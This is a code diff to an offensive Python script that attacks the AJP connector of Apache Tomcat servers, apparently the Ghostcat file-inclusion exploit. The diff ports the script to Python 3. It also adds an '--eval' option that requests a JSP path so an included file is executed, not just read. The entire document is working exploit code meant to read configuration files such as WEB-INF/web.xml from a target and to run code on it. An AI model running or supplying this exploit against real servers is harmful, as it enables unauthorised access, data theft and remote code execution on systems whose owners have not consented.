@@ -259,7 +259,7 @@ class Tomcat(object):
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.connect((target_host, target_port))
-		self.stream = self.socket.makefile("rb", bufsize=0)
+		self.stream = self.socket.makefile("rb", buffering=0)
 
 	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
 		self.req_uri = req_uri
@@ -291,12 +291,21 @@ parser = argparse.ArgumentParser()
 parser.add_argument("target", type=str, help="Hostname or IP to attack")
 parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
 parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
+parser.add_argument("-e", "--eval", action="store_true", default=False, help="Execute jsp")
+
 args = parser.parse_args()
 t = Tomcat(args.target, args.port)
-_,data = t.perform_request('/asdf',attributes=[
-    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
-    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
-    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
-    ])
+if not args.eval:
+	_,data = t.perform_request('/asdf',attributes=[
+		{'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
+		{'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
+		{'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
+		])
+else:
+	_,data = t.perform_request('/asdf.jsp',attributes=[
+		{'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
+		{'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
+		{'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
+		])
 print('----------------------------')
-print("".join([d.data for d in data]))
+print("".join([d.data.decode('utf-8', errors='ignore') for d in data]))
